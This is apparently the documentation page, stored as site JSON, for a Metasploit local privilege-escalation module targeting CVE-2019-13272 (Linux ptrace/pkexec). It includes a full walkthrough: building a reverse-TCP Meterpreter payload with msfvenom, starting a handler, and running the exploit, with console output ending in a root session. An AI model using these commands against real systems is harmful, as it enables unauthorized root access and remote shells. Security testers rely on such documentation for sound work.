{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/ptrace_traceme_pkexec_helper","result":{"data":{"moduleMetadataJson":{"id":"e58b3a94-757b-5d02-bf78-17c206a7a4be","name":"Linux Polkit pkexec helper PTRACE_TRACEME local root exploit","fullname":"exploit/linux/local/ptrace_traceme_pkexec_helper","description":"This module exploits an issue in ptrace_link in kernel/ptrace.c before Linux\n          kernel 5.1.17. This issue can be exploited from a Linux desktop terminal, but\n          not over an SSH session, as it requires execution from within the context of\n          a user with an active Polkit agent.\n          In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles\n          the recording of the credentials of a process that wants to create a ptrace\n          relationship, which allows local users to obtain root access by leveraging\n          certain scenarios with a parent-child process relationship, where a parent drops\n          privileges and calls execve (potentially allowing control by an attacker). One\n          contributing factor is an object lifetime issue (which can also cause a panic).\n          Another contributing factor is incorrect marking of a ptrace relationship as\n          privileged, which is exploitable through (for example) Polkit's pkexec helper\n          with PTRACE_TRACEME.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/ptrace_traceme_pkexec_helper","documentationSlug":"/modules/documentation/exploit/linux/local/ptrace_traceme_pkexec_helper"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits an issue in ptrace_link in kernel/ptrace.c before Linux\nkernel 5.1.17. This issue can be exploited from a Linux desktop terminal, but\nnot over an SSH session, as it requires execution from within the context of\na user with an active Polkit agent.</p>\n<p>In the Linux kernel before 5.1.17, ptrace<em>link in kernel/ptrace.c mishandles\nthe recording of the credentials of a process that wants to create a ptrace\nrelationship, which allows local users to obtain root access by leveraging\ncertain scenarios with a parent-child process relationship, where a parent drops\nprivileges and calls execve (potentially allowing control by an attacker). One\ncontributing factor is an object lifetime issue (which can also cause a panic).\nAnother contributing factor is incorrect marking of a ptrace relationship as\nprivileged, which is exploitable through (for example) Polkit's pkexec helper\nwith PTRACE</em>TRACEME. NOTE: SELinux deny_ptrace might be a usable workaround in\nsome environments.</p>\n<p>  This module has been tested successfully on:</p>\n<ul>\n<li>Ubuntu 16.04.5 kernel 4.15.0-29-generic</li>\n<li>Ubuntu 18.04.1 kernel 4.15.0-20-generic</li>\n<li>Ubuntu 19.04 kernel 5.0.0-15-generic</li>\n<li>Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic</li>\n<li>Linux Mint 17.3 kernel 4.4.0-89-generic</li>\n<li>Linux Mint 18.3 kernel 4.13.0-16-generic</li>\n<li>Linux Mint 19 kernel 4.15.0-20-generic</li>\n<li>Xubuntu 16.04.4 kernel 4.13.0-36-generic</li>\n<li>ElementaryOS 0.4.1 4.8.0-52-generic</li>\n<li>Backbox 6 kernel 4.18.0-21-generic</li>\n<li>Parrot OS 4.5.1 kernel 4.19.0-parrot1-13t-amd64</li>\n<li>Kali kernel 4.19.0-kali5-amd64</li>\n<li>Redcore 1806 (LXQT) kernel 4.16.16-redcore</li>\n<li>MX 18.3 kernel 4.19.37-2~mx17+1</li>\n<li>RHEL 8.0 kernel 4.18.0-80.el8.x86_64</li>\n<li>Debian 9.4.0 kernel 4.9.0-6-amd64</li>\n<li>Debian 10.0.0 kernel 4.19.0-5-amd64</li>\n<li>Devuan 2.0.0 kernel 4.9.0-6-amd64</li>\n<li>SparkyLinux 5.8 kernel 4.19.0-5-amd64</li>\n<li>Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64</li>\n<li>Manjaro 18.0.3 kernel 4.19.23-1-MANJARO</li>\n<li>Mageia 6 kernel 4.9.35-desktop-1.mga6</li>\n<li>Antergos 18.7 kernel 4.17.6-1-ARCH</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Get a shell or meterpreter session on the target</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/local/ptrace_traceme_pkexec_helper</code></li>\n<li>Do: <code class=\"language-text\">set session #</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>WritableDir</strong></p>\n<p>  A folder we can write files to.  Defaults to <code class=\"language-text\">/tmp</code></p>\n<p>  <strong>COMPILE</strong></p>\n<p>  If we should live compile on the system, or drop pre-created binaries.  Auto will determine if gcc/libs are installed to compile live on the system.  Defaults to <code class=\"language-text\">Auto</code></p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubuntu-1804-with-linux-4150-13-generic\" style=\"position:relative;\"><a href=\"#ubuntu-1804-with-linux-4150-13-generic\" aria-label=\"ubuntu 1804 with linux 4150 13 generic permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 18.04 (with Linux 4.15.0-13-generic)</h3>\n<h4 id=\"initial-access\" style=\"position:relative;\"><a href=\"#initial-access\" aria-label=\"initial access permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Initial Access</h4>\n<p>We need to gain an initial session on the target system before we can use this module.\nAdditionally this module will only work from a GUI session, and will fail with an SSH session.\nIn order to gain a compatible session we will upload a payload binary and run it from gnome-terminal.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"># Create a payload binary\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o binary\n\n# Start a handler\nmsfconsole\nmsf5 &gt; use exploit/multi/handler\nmsf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp\npayload =&gt; linux/x64/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set LHOST 192.168.56.1\nLHOST =&gt; 192.168.56.1\nmsf5 exploit(multi/handler) &gt; set LPORT 4444\nLPORT =&gt; 4444\nmsf5 exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:4444\n\n# Execute the payload using gnome-terminal on the target\n\n[*] Sending stage (3021284 bytes) to 192.168.56.7\n[*] Meterpreter session 1 opened (192.168.56.1:4444 -&gt; 192.168.56.7:33244) at 2019-09-03 17:42:17 +0800\n\nmeterpreter &gt; background</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"escalate\" style=\"position:relative;\"><a href=\"#escalate\" aria-label=\"escalate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Escalate</h4>\n<p>In this scenario, gcc is installed so we can live compile on the system.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/handler) &gt; use exploit/linux/local/ptrace_traceme_pkexec_helper\nmsf5 exploit(linux/local/ptrace_traceme_pkexec_helper) &gt; set LHOST 192.168.56.1\nLHOST =&gt; 192.168.56.1\nmsf5 exploit(linux/local/ptrace_traceme_pkexec_helper) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf5 exploit(linux/local/ptrace_traceme_pkexec_helper) &gt; set VERBOSE true\nVERBOSE =&gt; true\nmsf5 exploit(linux/local/ptrace_traceme_pkexec_helper) &gt; exploit\n[*] Started reverse TCP handler on 192.168.56.1:4444\n[+] Kernel version 4.15.0-13-generic appears to be vulnerable\n[+] pkexec is installed\n[*] Writing &#39;/tmp/.zacecz&#39; (285 bytes) ...\n[+] gcc is installed\n[*] Live compiling exploit on system...\n[*] Writing &#39;/tmp/.fmrefxhjjcq.c&#39; (9718 bytes) ...\n[*] Executing exploit &#39;/tmp/.fmrefxhjjcq&#39;\n[*] Transmitting intermediate stager...(126 bytes)\n[*] Sending stage (3021284 bytes) to 192.168.56.7\n[*] Exploit result:\nLinux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\n[.] Checking environment ...\n[!] Warning: $XDG_SESSION_ID is not set\n[!] Warning: Could not find active PolKit agent\n[~] Done, looks good\n[.] Searching for known helpers ...\n[~] Found known helper: /usr/lib/gnome-settings-daemon/gsd-backlight-helper\n[.] Using helper: /usr/lib/gnome-settings-daemon/gsd-backlight-helper\n[.] Spawning suid process (/usr/bin/pkexec) ...\n[.] Tracing midpid ...\n[~] Attached to midpid\n[*] Meterpreter session 2 opened (192.168.56.1:4444 -&gt; 192.168.56.7:58270) at 2019-09-03 17:29:57 +0800\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"escalate-w-pre-compiled-binaries\" style=\"position:relative;\"><a href=\"#escalate-w-pre-compiled-binaries\" aria-label=\"escalate w pre compiled binaries permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Escalate w/ pre-compiled binaries</h4>\n<p>It is possible to force pre-compiled binaries, in a scenario where <code class=\"language-text\">build-essential</code> or <code class=\"language-text\">gcc</code> aren't on the system.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/handler) &gt; use exploit/linux/local/ptrace_traceme_pkexec_helper\nmsf5 exploit(linux/local/ptrace_traceme_pkexec_helper) &gt; set LHOST 192.168.56.1\nLHOST =&gt; 192.168.56.1\nmsf5 exploit(linux/local/ptrace_traceme_pkexec_helper) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf5 exploit(linux/local/ptrace_traceme_pkexec_helper) &gt; set COMPILE False\nCOMPILE =&gt; False\nmsf5 exploit(linux/local/ptrace_traceme_pkexec_helper) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:4444\n[+] Kernel version 4.15.0-13-generic appears to be vulnerable\n[+] pkexec is installed\n[*] Writing &#39;/tmp/.yaamzkukaml&#39; (285 bytes) ...\n[*] Dropping pre-compiled exploit on system...\n[*] Writing &#39;/tmp/.wtoplrisgzzo&#39; (51200 bytes) ...\n[*] Executing exploit &#39;/tmp/.wtoplrisgzzo&#39;\n[*] Transmitting intermediate stager...(126 bytes)\n[*] Sending stage (3021284 bytes) to 192.168.56.7\n[*] Exploit result:\nLinux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\n[.] Checking environment ...\n[!] Warning: $XDG_SESSION_ID is not set\n[!] Warning: Could not find active PolKit agent\n[~] Done, looks good\n[.] Searching for known helpers ...\n[~] Found known helper: /usr/lib/gnome-settings-daemon/gsd-backlight-helper\n[.] Using helper: /usr/lib/gnome-settings-daemon/gsd-backlight-helper\n[.] Spawning suid process (/usr/bin/pkexec) ...\n[.] Tracing midpid ...\n[~] Attached to midpid\n[*] Meterpreter session 3 opened (192.168.56.1:4444 -&gt; 192.168.56.7:58272) at 2019-09-03 17:30:16 +0800</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"e58b3a94-757b-5d02-bf78-17c206a7a4be"}}}